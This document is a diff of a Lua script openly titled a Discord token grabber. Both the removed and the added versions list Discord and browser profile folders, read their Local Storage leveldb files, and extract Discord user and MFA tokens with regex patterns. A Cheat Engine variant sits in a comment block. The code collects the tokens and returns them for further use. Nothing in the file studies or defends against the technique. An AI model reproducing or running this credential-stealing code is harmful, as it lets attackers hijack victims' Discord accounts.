@@ -1,83 +1,106 @@
--- Discord Token Grabber v3 Script by HexaG0n
--- This will only grab the tokens,
--- It will not send it to any webhook.
--- 27/7/2021
+-- NORMAL LUA
+function get_discord_tokens()
+    local roaming=os.getenv('appdata')
+    local lappd=os.getenv('localappdata')
 
-function getDiscordTokens(path)
+    local listDirectory=function(path)
+        local get=io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
+        local files={}
 
-    local function listDir(path)
-        return io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
+        for file in get:gmatch('[^\r\n]+') do
+            files[#files+1]=path..'\\'..file
+        end
+        return files
     end
 
-    local function getToken(path)
-        -- Reads the .ldb files in hexadecimal bytes
-        local read = io.open(path, 'rb'):read('*a'):gsub('.', function(c)
-        return string.format('%02X', c:byte()) end)
-        local tokens = ''
-
-        -- Matches user token
-        for tok in read:gmatch('22'..('%w'):rep(48)..'2E'..('%w'):rep(12)..'2E'..('%w'):rep(54)..'22') do
-            if tok ~= nil then
-                tok = tok:gsub('..', function(c)
-                return string.char(tonumber(c, 16)) end):sub(2, -2)
-
-                tokens = tokens..tok..'\n'
-            end
-        end
-
-        -- Matches mfa token
-        for mfa in read:gmatch('226D66612E'..('%w'):rep(168)..'22') do
-            if mfa ~= nil then
-                mfa = mfa:gsub('..', function(c)
-                return string.char(tonumber(c, 16)) end):sub(2, -2)
-
-                tokens = tokens..mfa..'\n'
-            end
-        end
-
-        if tokens ~= nil or tokens ~= '' then
-            return tokens
-        end
-    end
-
-    local path = path..'\\Local Storage\\leveldb\\'
-    local files = listDir(path)
-    local tokens = ''
-
-    if files ~= '' then
-        for file in files:gmatch('[^\r\n]+') do
-
-            if file:find('.ldb') ~= nil then
-                tokens = tokens..getToken(path..file)
-            end
-
-        end
-        return tokens:sub(1, -2)
-    end
-end
-
--- Main
-
-LocalAppData = os.getenv('localappdata')
-Roaming = os.getenv('appdata')
-Tokens = ''
-
-PATH = {
-    ['Discord'] = Roaming..'\\Discord',
-    ['Discord Canary'] = Roaming..'\\discordcanary',
-    ['Discord PTB'] = Roaming..'\\discordptb',
-    ['Google Chrome'] = LocalAppData..'\\Google\\Chrome\\User Data\\Default',
-    ['Opera'] = Roaming..'\\Opera Software\\Opera Stable',
-    ['Brave'] = LocalAppData..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    ['Yandex'] = LocalAppData..'\\Yandex\\YandexBrowser\\User Data\\Default'
+    local PATHS = {
+        roaming..'\\Discord',
+        roaming..'\\discordcanary',
+        roaming..'\\discordptb',
+        lappd..'\\Google\\Chrome\\User Data\\Default',
+        roaming..'\\Opera Software\\Opera Stable',
+        lappd..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        lappd..'\\Yandex\\YandexBrowser\\User Data\\Default'
     }
 
-for i,v in pairs(PATH) do
-    if getDiscordTokens(v) ~= nil then
-        Tokens = Tokens..getDiscordTokens(v)..'\n'
-    end
-end
-Tokens = Tokens:sub(1, -2)
+    local tokens={}
 
-print(Tokens)
--- Do whatever you want with Tokens
+    -- MAIN
+    for _,path in ipairs(PATHS) do
+        path=path..'\\Local Storage\\leveldb\\'
+
+        local flist=listDirectory(path)
+        if #flist>0 then
+            for _,file in ipairs(flist) do
+                if file:find('%.ldb') then
+                    local open=io.open(file,'rb')
+                    local read=open:read('*a')open:close()
+
+                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
+                        ntok=ntok:sub(2,-2)
+                        if #ntok>=59 then
+                            tokens[#tokens+1]=ntok
+                        end
+                    end
+
+                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
+                        mfatok=mfatok:sub(2,-2)
+                        if #mfatok>=88 then
+                            tokens[#tokens+1]=mfatok
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return tokens
+end
+
+
+--[[ CELUA
+function get_discord_tokens()
+    local roaming=os.getenv('appdata')
+    local lappd=os.getenv('localappdata')
+    local PATHS = {
+        roaming..'\\Discord',
+        roaming..'\\discordcanary',
+        roaming..'\\discordptb',
+        lappd..'\\Google\\Chrome\\User Data\\Default',
+        roaming..'\\Opera Software\\Opera Stable',
+        lappd..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        lappd..'\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    local tokens={}
+
+    -- MAIN
+    for _,path in ipairs(PATHS) do
+        path=path..'\\Local Storage\\leveldb\\'
+
+        local flist=getFileList(path)
+        if #flist>0 then
+            for _,file in ipairs(flist) do
+                if file:find('%.ldb') then
+                    local open=io.open(file,'rb')
+                    local read=open:read('*a')open:close()
+
+                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
+                        ntok=ntok:sub(2,-2)
+                        if #ntok>=59 then
+                            tokens[#tokens+1]=ntok
+                        end
+                    end
+
+                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
+                        mfatok=mfatok:sub(2,-2)
+                        if #mfatok>=88 then
+                            tokens[#tokens+1]=mfatok
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return tokens
+end
+]]
